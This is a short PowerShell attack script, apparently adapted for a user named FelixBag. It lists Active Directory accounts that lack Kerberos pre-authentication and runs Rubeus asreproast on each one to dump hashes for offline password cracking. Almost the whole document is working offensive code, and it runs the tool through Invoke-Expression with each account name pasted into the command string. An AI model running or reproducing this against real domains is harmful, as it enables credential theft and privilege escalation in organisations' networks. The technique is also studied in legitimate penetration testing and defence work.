<#
.SYNOPSIS
  Enumerates AS-REP roastable users from a domain and extracts their hashes for offline cracking.

.AUTHOR
  Adaptado para FelixBag

.REQUIREMENTS
  - PowerShell
  - No requiere Mimikatz
  - Solo necesita acceso a un DC y permisos de usuario estándar

.EXAMPLE
  .\Invoke-ASREPRoast.ps1

#>

Import-Module ActiveDirectory

$users = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties SamAccountName

foreach ($user in $users) {
    Write-Host "[*] Found AS-REP roastable user: $($user.SamAccountName)"
    $kerbHash = Invoke-Expression "rubeus.exe asreproast /user:$($user.SamAccountName)"
    Write-Output $kerbHash
}
